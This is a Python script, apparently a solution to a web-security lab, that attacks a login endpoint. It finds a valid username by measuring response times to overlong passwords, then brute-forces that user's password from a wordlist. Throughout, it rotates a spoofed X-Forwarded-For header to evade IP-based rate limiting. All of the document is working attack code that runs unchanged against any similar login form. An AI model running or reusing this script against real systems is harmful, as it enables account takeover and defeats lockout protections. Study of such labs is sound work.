import requests
import os

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    
def get_username_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    users_path = os.path.join(parent_dir, '../wordlists', 'users.txt')
    with open(users_path, 'r') as f:
        return f.read().splitlines()

passwords = get_password_wordlist()
usernames = get_username_wordlist()

LAB_URL = input("Enter the URL of the lab: ")


def find_valid_user(usernames_wordlist: list[str]) -> str:
    x_forwarded_for_counter = 1100
  
    authentication_time = {}

    for username in usernames_wordlist:
        headers = {
            "X-Forwarded-For": f"127.0.0.{x_forwarded_for_counter}"
        }
        url = f"{LAB_URL}/login"
        data = {
            "username": username,
            "password": "a"*600
        }
        r = requests.post(url, data=data, headers=headers)
        x_forwarded_for_counter += 1

        authentication_time[username] = r.elapsed.total_seconds()
    sorted_authentication_time = sorted(authentication_time.items(), key=lambda item: item[1])
    print(f"Found valid user: {sorted_authentication_time[-1][0]} with time {sorted_authentication_time[-1][1]}")
    return sorted_authentication_time[-1][0]
       
def find_valid_password(username: str, passwords_wordlist: list[str]) -> str:
    x_forwarded_for_counter = 1200
  
    for password in passwords_wordlist:
        headers = {
            "X-Forwarded-For": f"127.0.0.{x_forwarded_for_counter}"
        }
        url = f"{LAB_URL}/login"
        data = {
            "username": username,
            "password": password
        }
        r = requests.post(url, data=data, headers=headers)
        x_forwarded_for_counter += 1
        if not "Invalid username or password." in r.text:
            print(f"Found valid password: {password} for user {username}")
            return password

if __name__ == "__main__":
    valid_user = find_valid_user(usernames)
    valid_password = find_valid_password(valid_user, passwords)
    print(f"Valid credentials: {valid_user}:{valid_password}")